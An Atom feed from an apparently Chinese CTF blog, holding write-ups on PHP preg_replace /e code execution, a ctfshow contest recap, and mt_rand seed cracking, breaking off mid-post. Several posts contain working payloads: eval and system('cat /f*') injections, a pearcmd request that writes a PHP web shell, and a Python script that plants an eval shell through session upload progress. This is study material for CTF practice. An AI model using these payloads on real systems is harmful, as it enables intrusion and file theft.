<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>p0l1st&#39;s blog</title>
  
  
  <link href="http://example.com/atom.xml" rel="self"/>
  
  <link href="http://example.com/"/>
  <updated>2024-01-19T14:59:01.770Z</updated>
  <id>http://example.com/</id>
  
  <author>
    <name>p0l1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>preg_replace /e模式下的代码执行</title>
    <link href="http://example.com/2024/01/19/preg-replace-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/"/>
    <id>http://example.com/2024/01/19/preg-replace-e%E6%A8%A1%E5%BC%8F%E4%B8%8B%E7%9A%84%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C/</id>
    <published>2024-01-19T14:56:33.000Z</published>
    <updated>2024-01-19T14:59:01.770Z</updated>
    
    <content type="html"><![CDATA[<p>案例：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27; . $re . &#x27;)/ei&#x27;,&#x27;strtolower(&quot;\\1&quot;)&#x27;,$str）</span><br></pre></td></tr></table></figure><h1 id="e模式"><a href="#e模式" class="headerlink" title="&#x2F;e模式"></a>&#x2F;e模式</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace($pattern,$replacement.$string)</span><br></pre></td></tr></table></figure><p>&#x2F;e 修正符使preg_replace()将<strong>replacement</strong>参数当作PHP代码执行(确保replacement构成合法PHP代码字符串)。</p><p>这里介绍一下preg_replace()的一些模式：</p><ul><li>&#x2F;g 表示该表达式用来在<strong>输入字符串中查找所有可能的匹配</strong>，返回的结果可以是<strong>多个</strong>。</li><li>&#x2F;i 表示匹配的时候<strong>不区分大小写</strong></li><li>&#x2F;m 表示<strong>多行匹配</strong>（匹配换行符两端的潜在匹配）</li><li>&#x2F;s <strong>单行模式匹配</strong></li><li>&#x2F;e <strong>可执行模式</strong></li><li>&#x2F;x 忽<strong>略空白模式</strong></li></ul><h1 id="反向引用"><a href="#反向引用" class="headerlink" title="反向引用"></a>反向引用</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">对一个正则表达式模式或部分模式 两边添加圆括号 将导致相关 匹配存储到一个临时缓冲区 中，所捕获的每个子匹配都按照在正则表达式模式中从左到右出现的顺序存储。缓冲区编号从 1 开始，最多可存储 99 个捕获的子表达式。每个缓冲区都可以使用 &#x27;\n&#x27; 访问，其中 n 为一个标识特定缓冲区的一位或两位十进制数。</span><br><span class="line"></span><br><span class="line">通俗来讲，就是\后面跟几，就匹配第几个。</span><br><span class="line">这里的\1就是指的是第一个子匹配项。</span><br></pre></td></tr></table></figure><h1 id="exam"><a href="#exam" class="headerlink" title="exam"></a>exam</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span> </span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/test/e&quot;</span>,<span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>],<span class="string">&quot;jutst test&quot;</span>); </span><br><span class="line"><span class="meta">?&gt;</span> </span><br><span class="line"></span><br></pre></td></tr></table></figure><p>令h&#x3D;phpinfo()，那么代码就会被执行</p><p>如果改为</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">test</span>(<span class="params"><span class="variable">$str</span></span>)</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">preg_replace</span>(<span class="string">&quot;/s*[php](.+?)[/php]s*/ies&quot;</span>, <span class="string">&#x27;test(&quot;\1&quot;)&#x27;</span>, <span class="variable">$_GET</span>[<span class="string">&quot;h&quot;</span>]);</span><br><span class="line"><span class="meta">?&gt;</span> </span><br></pre></td></tr></table></figure><p>h&#x3D;[php]phpinfo()[&#x2F;php]就不会被执行，因为经过正则匹配后，test(“\1”)就变为test(“phpinfo”)，此时php被当作字符串</p><p>但是如果我们提交**h&#x3D;[php]{${phpinfo()}}[&#x2F;php]**，就能执行phpinfo，因为在php中，双引号中包含变量，php解释器会将其替换为变量解释后的结果，而单引号不会。</p><p>所以如果**”test(‘\1’)”**就不会执行phpinfo</p><h1 id="例题-BJDCTF2020-ZJCTF，不过如此"><a href="#例题-BJDCTF2020-ZJCTF，不过如此" class="headerlink" title="例题[BJDCTF2020]ZJCTF，不过如此"></a>例题[BJDCTF2020]ZJCTF，不过如此</h1><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$id</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;id&#x27;</span>];</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;id&#x27;</span>] = <span class="variable">$id</span>;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">complex</span>(<span class="params"><span class="variable">$re</span>, <span class="variable">$str</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(</span><br><span class="line">        <span class="string">&#x27;/(&#x27;</span> . <span class="variable">$re</span> . <span class="string">&#x27;)/ei&#x27;</span>,</span><br><span class="line">        <span class="string">&#x27;strtolower(&quot;\\1&quot;)&#x27;</span>,</span><br><span class="line">        <span class="variable">$str</span></span><br><span class="line">    );</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span>(<span class="variable">$_GET</span> <span class="keyword">as</span> <span class="variable">$re</span> =&gt; <span class="variable">$str</span>) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="title function_ invoke__">complex</span>(<span class="variable">$re</span>, <span class="variable">$str</span>). <span class="string">&quot;\n&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">getFlag</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">@<span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>payload</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;phpinfo()&#125;</span><br></pre></td></tr></table></figure><p>这里的正则就变成:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">preg_replace(&#x27;/(&#x27;S*)/ei&#x27;,&#x27;strtolower(&quot;phpinfo()&quot;)&#x27;,$str)</span><br></pre></td></tr></table></figure><p>这里的\S意思是匹配所有字符，注意是大写S，大小写S是由区别的</p><ul><li>[\S]表示非空白就匹配</li><li>[\s]表示出现空白就匹配</li></ul><p>最终payload:</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">\S*=$&#123;eval($_GET[pass])&#125;&amp;pass=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p>或</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?\S*=$&#123;getFlag()&#125;&amp;cmd=system(&#x27;cat /f*&#x27;);</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240119223722075.png" alt="image-20240119223722075"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;案例：&lt;/p&gt;
&lt;figure class=&quot;highlight plaintext&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gutter&quot;&gt;&lt;pre&gt;&lt;span class=&quot;line&quot;&gt;1&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&quot;code&quot;</summary>
      
    
    
    
    
    <category term="php CTF" scheme="http://example.com/tags/php-CTF/"/>
    
  </entry>
  
  <entry>
    <title>ctfshow元旦水友赛复盘</title>
    <link href="http://example.com/2024/01/16/ctfshow%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9Bweb%E5%A4%8D%E7%9B%98/"/>
    <id>http://example.com/2024/01/16/ctfshow%E5%85%83%E6%97%A6%E6%B0%B4%E5%8F%8B%E8%B5%9Bweb%E5%A4%8D%E7%9B%98/</id>
    <published>2024-01-16T04:44:01.000Z</published>
    <updated>2024-01-16T12:21:23.931Z</updated>
    
    <content type="html"><![CDATA[<h1 id="easy-include"><a href="#easy-include" class="headerlink" title="easy_include"></a>easy_include</h1><p>打开环境</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">waf</span>(<span class="params"><span class="variable">$path</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$path</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&quot;.&quot;</span>,<span class="string">&quot;&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/^[a-z]+/&quot;</span>,<span class="variable">$path</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">waf</span>(<span class="variable">$_POST</span>[<span class="number">1</span>]))&#123;</span><br><span class="line">    <span class="keyword">include</span> <span class="string">&quot;file://&quot;</span>.<span class="variable">$_POST</span>[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="pearcmd命令执行"><a href="#pearcmd命令执行" class="headerlink" title="pearcmd命令执行"></a>pearcmd命令执行</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GET:  ?+config-create+/&amp;/&lt;?=system(&#x27;tac$&#123;IFS&#125;/f*&#x27;);?&gt;+/var/www/html/a</span><br><span class="line">POST: 1=localhost/usr/local/lib/php/pearcmd.php</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240116131358393.png" alt="image-20240116131358393"></p><p>查看</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST:</span><br><span class="line">1=localhost/var/www/html/a</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240116131431072.png" alt="image-20240116131431072"></p><h2 id="包含session"><a href="#包含session" class="headerlink" title="包含session"></a>包含session</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://cbe0014a-fe76-46a2-9eae-43421a8913ff.challenge.ctf.show/&quot;</span></span><br><span class="line"></span><br><span class="line">data = &#123;</span><br><span class="line">    <span class="string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="string">&#x27;&lt;?php eval($_POST[2]);?&gt;&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;1&#x27;</span>:<span class="string">&#x27;localhost/tmp/sess_ctfshow&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;2&#x27;</span>:<span class="string">&#x27;system(&quot;cat /f*&quot;);&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">file = &#123;</span><br><span class="line">    <span class="string">&#x27;file&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line">cookies = &#123;</span><br><span class="line">    <span class="string">&#x27;PHPSESSID&#x27;</span>: <span class="string">&#x27;ctfshow&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">response = requests.post(url=url,data=data,files=file,cookies=cookies)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(response.text)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240116131018734.png" alt="image-20240116131018734"></p><h1 id="月月的爱情故事"><a href="#月月的爱情故事" class="headerlink" title="月月的爱情故事"></a>月月的爱情故事</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">你知道吗。月月今天遇到了一个让他心动的女孩，她的名字叫做小雨，太幸运了。小雨是一个活泼可爱的女孩！她的笑容如同春天里的阳光。温暖了月月的心，月月第一次见到小雨是在图书馆里！事情是这样的。当时小雨正在专心致志地看书。阳光洒在她的脸上。让她看起来如同天使一般美丽！月月被小雨的美丽和才华所吸引。开始暗暗关注她。在接下来的日子里。月月开始尝试与小雨接触！和她聊天和学习。他们有着许多共同的兴趣爱好，一起度过了许多快乐的时光，渐渐地！月月发现自己对小雨产生了特殊的感情，他开始向小雨表达自己的心意，然而，小雨并没有立即接受月月的感情！她告诉月月。她曾经受过感情的伤害，需要时间来慢慢修复自己的心灵。月月尊重小雨的决定！他开始用更多的时间和精力来陪伴小雨，帮助她走出过去的阴影。在接下来的几个月里。月月和小雨的关系逐渐升温！他们一起参加了许多校园活动。一起探索了那个城市的角角落落。渐渐地！雨也开始对月月产生了感情。她发现自己越来越依赖他。越来越喜欢他。最终！小雨和月月走到了一起，他们的爱情故事成为了校园里的佳话。让同学们都羡慕不已，他们一起度过了青春岁月，一起经历了成长和进步的喜悦与挫折！他们的感情越来越深厚。也越来越稳定。在他们的恋爱过程中，月月和小雨也学会了如何相处和包容对方！他们互相理解互相支持。一起面对生活中的挑战和困难！他们的爱情让他们变得更加坚强和勇敢，也让他们感受到了生命中最美好的东西。月月相信他们能走得更远，更相信自己不会辜负小雨，当他们遭遇挫折和失败的时候！两人永远不会被打倒。这正是他们彼此爱的力量。在他们空闲的时候，月月经常带小雨出去逛街！晚上一起看电影。有一天！月月说将来他要给小雨一场最美的婚礼，小雨十分感动也十分期盼。就这样。这份约定成为了两人前进的动力。两人共同努力最终一起考上了同一所大学的研究生。两人非常开心彼此深情地看着对方似乎有说不完的情话！研究生三年他们互相帮助一起度过了人生最有意义的大学时光，毕业后两人也很轻松找到了自己心仪的企业。月月没有忘记当初的约定。是的。他要给小雨一场最美好的婚礼。终于！这一天到来了，小雨穿上月月为她定制的婚纱。他们手牵手走向了更美好的未来。场下。所有的嘉宾都为他们鼓掌和欢呼并祝福他们的爱情能够永恒长存。</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">VTJGc2RHVmtYMS9iVkY0NXp5dGxrZUVoZWZBcWtwSFFkTXF0VUxrMk9pYkxxNzlOSEpNbTlyUDNDdGtLckU0MQpDYUJKbU1JVmNVVlNiM0l6cEhldVd3PT0=</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">hint:试试摩斯吧！</span><br></pre></td></tr></table></figure><p>Base64解码</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">U2FsdGVkX1/bVF45zytlkeEhefAqkpHQdMqtULk2OibLq79NHJMm9rP3CtkKrE41</span><br><span class="line">CaBJmMIVcUVSb3IzpHeuWw==</span><br></pre></td></tr></table></figure><p>rabbit或AES，但是不知道密钥</p><p>看了看wp，上面那段文字中只有。，！，把它们分别替换为. - 和空格</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">s = <span class="string">&quot;你知道吗。月月今天遇到了一个让他心动的女孩，她的名字叫做小雨，太幸运了。小雨是一个活泼可爱的女孩！她的笑容如同春天里的阳光。温暖了月月的心，月月第一次见到小雨是在图书馆里！事情是这样的。当时小雨正在专心致志地看书。阳光洒在她的脸上。让她看起来如同天使一般美丽！月月被小雨的美丽和才华所吸引。开始暗暗关注她。在接下来的日子里。月月开始尝试与小雨接触！和她聊天和学习。他们有着许多共同的兴趣爱好，一起度过了许多快乐的时光，渐渐地！月月发现自己对小雨产生了特殊的感情，他开始向小雨表达自己的心意，然而，小雨并没有立即接受月月的感情！她告诉月月。她曾经受过感情的伤害，需要时间来慢慢修复自己的心灵。月月尊重小雨的决定！他开始用更多的时间和精力来陪伴小雨，帮助她走出过去的阴影。在接下来的几个月里。月月和小雨的关系逐渐升温！他们一起参加了许多校园活动。一起探索了那个城市的角角落落。渐渐地！雨也开始对月月产生了感情。她发现自己越来越依赖他。越来越喜欢他。最终！小雨和月月走到了一起，他们的爱情故事成为了校园里的佳话。让同学们都羡慕不已，他们一起度过了青春岁月，一起经历了成长和进步的喜悦与挫折！他们的感情越来越深厚。也越来越稳定。在他们的恋爱过程中，月月和小雨也学会了如何相处和包容对方！他们互相理解互相支持。一起面对生活中的挑战和困难！他们的爱情让他们变得更加坚强和勇敢，也让他们感受到了生命中最美好的东西。月月相信他们能走得更远，更相信自己不会辜负小雨，当他们遭遇挫折和失败的时候！两人永远不会被打倒。这正是他们彼此爱的力量。在他们空闲的时候，月月经常带小雨出去逛街！晚上一起看电影。有一天！月月说将来他要给小雨一场最美的婚礼，小雨十分感动也十分期盼。就这样。这份约定成为了两人前进的动力。两人共同努力最终一起考上了同一所大学的研究生。两人非常开心彼此深情地看着对方似乎有说不完的情话！研究生三年他们互相帮助一起度过了人生最有意义的大学时光，毕业后两人也很轻松找到了自己心仪的企业。月月没有忘记当初的约定。是的。他要给小雨一场最美好的婚礼。终于！这一天到来了，小雨穿上月月为她定制的婚纱。他们手牵手走向了更美好的未来。场下。所有的嘉宾都为他们鼓掌和欢呼并祝福他们的爱情能够永恒长存。&quot;</span></span><br><span class="line">a = <span class="string">&quot;&quot;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> s:</span><br><span class="line">    <span class="keyword">if</span> i == <span class="string">&quot;。&quot;</span>:</span><br><span class="line">        a+=<span class="string">&quot;.&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i ==<span class="string">&quot;，&quot;</span>:</span><br><span class="line">        a+=<span class="string">&quot;-&quot;</span></span><br><span class="line">    <span class="keyword">elif</span> i ==<span class="string">&quot;！&quot;</span>:</span><br><span class="line">        a+=<span class="string">&quot; &quot;</span></span><br><span class="line"><span class="built_in">print</span>(a)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240116142307549.png" alt="image-20240116142307549"></p><p>解密成功</p><p><img src="/../images/image-20240116142522386.png" alt="image-20240116142522386"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;easy-include&quot;&gt;&lt;a href=&quot;#easy-include&quot; class=&quot;headerlink&quot; title=&quot;easy_include&quot;&gt;&lt;/a&gt;easy_include&lt;/h1&gt;&lt;p&gt;打开环境&lt;/p&gt;
&lt;figure class=&quot;highli</summary>
      
    
    
    
    
    <category term="ctf" scheme="http://example.com/tags/ctf/"/>
    
  </entry>
  
  <entry>
    <title>2024寒假刷题</title>
    <link href="http://example.com/2024/01/14/2024%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98/"/>
    <id>http://example.com/2024/01/14/2024%E5%AF%92%E5%81%87%E5%88%B7%E9%A2%98/</id>
    <published>2024-01-14T15:10:55.000Z</published>
    <updated>2024-01-19T13:21:11.734Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>访问环境</p><p><img src="/../images/image-20240115083520327.png" alt="image-20240115083520327"></p><p>这里说是要猜号，查看源码，发现check.php</p><p><img src="/../images/image-20240114231341961.png" alt="image-20240114231341961"></p><p>访问</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"> <span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#这不是抽奖程序的源代码！不许看！</span></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&quot;Content-Type: text/html;charset=utf-8&quot;</span>);</span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]))&#123;</span><br><span class="line"><span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]=<span class="title function_ invoke__">rand</span>(<span class="number">0</span>,<span class="number">999999999</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;seed&#x27;</span>]);</span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span>=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( <span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++ )&#123;</span><br><span class="line">    <span class="variable">$str</span>.=<span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$str_show</span> = <span class="title function_ invoke__">substr</span>(<span class="variable">$str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.<span class="variable">$str_show</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]))&#123;</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;num&#x27;</span>]===<span class="variable">$str</span>)&#123;x</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;抽奖，就是那么枯燥且无味，给你flag&#123;xxxxxxxxx&#125;&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&quot;&lt;p id=flag&gt;没抽中哦，再试试吧&lt;/p&gt;&quot;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_ invoke__">show_source</span>(<span class="string">&quot;check.php&quot;</span>); </span><br></pre></td></tr></table></figure><p>伪随机数种子</p><p>根据现有的字符串我们先来找出种子</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;5WyZDu7Byj&#x27;</span></span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(str1)-<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240115083456214.png" alt="image-20240115083456214"></p><p>然后使用php_mt_seed爆破得到种子</p><p><img src="/../images/image-20240115083620230.png" alt="image-20240115083620230"></p><p>根据这个种子得到完整的字符串(注意php版本在7.1.0以上)</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;/br&gt;&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">mt_srand</span>(<span class="number">395019830</span>); </span><br><span class="line"><span class="variable">$str_long1</span> = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line"><span class="variable">$str</span> = <span class="string">&#x27;&#x27;</span>;</span><br><span class="line"><span class="variable">$len1</span> = <span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = <span class="number">0</span>; <span class="variable">$i</span> &lt; <span class="variable">$len1</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$str</span> .= <span class="title function_ invoke__">substr</span>(<span class="variable">$str_long1</span>, <span class="title function_ invoke__">mt_rand</span>(<span class="number">0</span>, <span class="title function_ invoke__">strlen</span>(<span class="variable">$str_long1</span>) - <span class="number">1</span>), <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$str</span>;</span><br></pre></td></tr></table></figure><p><img src="/../images/image-20240115083739161.png" alt="image-20240115083739161"></p><p>得到flag</p><p><img src="/../images/image-20240115083354099.png" alt="image-20240115083354099"></p><h1 id="MRCTF2020-套娃"><a href="#MRCTF2020-套娃" class="headerlink" title="[MRCTF2020]套娃"></a>[MRCTF2020]套娃</h1><p>打开环境，F12查看</p><p><img src="/../images/image-20240115091923207.png" alt="image-20240115091923207"></p><p>代码如下</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$query = $_SERVER[&#x27;QUERY_STRING&#x27;];</span><br><span class="line"></span><br><span class="line"> if( substr_count($query, &#x27;_&#x27;) !== 0 || substr_count($query, &#x27;%5f&#x27;) != 0 )&#123;</span><br><span class="line">    die(&#x27;Y0u are So 